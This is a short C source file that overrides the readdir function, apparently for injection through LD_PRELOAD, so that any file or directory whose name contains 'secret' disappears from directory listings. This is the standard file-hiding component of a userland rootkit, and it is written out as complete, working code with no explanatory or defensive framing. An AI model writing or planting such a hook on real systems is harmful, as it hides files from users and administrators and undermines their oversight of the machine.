#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <dlfcn.h>
#include <string.h>
#include <dirent.h>

typedef struct dirent *(*orig_readdir_type)(DIR *);

struct dirent *readdir(DIR *dirp) {
    static orig_readdir_type orig_readdir = NULL;
    struct dirent *entry;

    if (!orig_readdir) {
        orig_readdir = (orig_readdir_type)dlsym(RTLD_NEXT, "readdir");
    }

    do {
        entry = orig_readdir(dirp);
        if (entry == NULL) break;
    } while (strstr(entry->d_name, "secret") != NULL);

    return entry;
}